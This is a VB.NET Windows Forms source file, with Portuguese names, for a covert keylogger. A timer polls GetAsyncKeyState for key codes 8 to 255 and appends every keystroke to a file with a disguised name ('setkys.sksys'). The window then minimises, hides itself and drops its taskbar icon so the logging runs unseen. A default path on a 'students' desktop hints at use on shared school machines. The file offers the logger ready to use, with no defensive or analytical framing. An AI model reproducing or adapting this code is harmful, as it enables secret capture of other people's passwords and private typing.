Imports System.IO
Imports System.Runtime.InteropServices

Public Class Form1
    Dim caminho As String = "C:\Users\Alunos\Desktop\txt.sk"
    <DllImport("user32.dll")>
    Shared Function GetAsyncKeyState(ByVal vKey As Integer) As Short
    End Function
    Private Sub Form1_KeyDown(sender As Object, e As KeyEventArgs) Handles MyBase.KeyDown


    End Sub

    Private Sub salvar(i As String)
        If File.Exists(caminho) Then
            File.WriteAllText(caminho, $"{File.ReadAllText(caminho)}{i}")
        Else
            File.WriteAllText(caminho, i)
        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        For i As Integer = 8 To 255
            Dim keyState As Short = GetAsyncKeyState(i)
            If (keyState And &H1) = &H1 Then
                Dim tecla As String = Chr(i)
                salvar(tecla)
            End If
        Next
        Me.WindowState = FormWindowState.Minimized
        Me.Hide()
        Me.ShowInTaskbar = False
        Me.ShowIcon = False
        Me.Focus()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If (My.Settings.Local = "" Or Directory.Exists(My.Settings.Local)) Then
            If (FolderBrowserDialog1.ShowDialog = DialogResult.OK) Then My.Settings.Local = FolderBrowserDialog1.SelectedPath
            My.Settings.Save()
        End If
        caminho = My.Settings.Local & "\setkys.sksys"
        Timer1.Start()
    End Sub
End Class
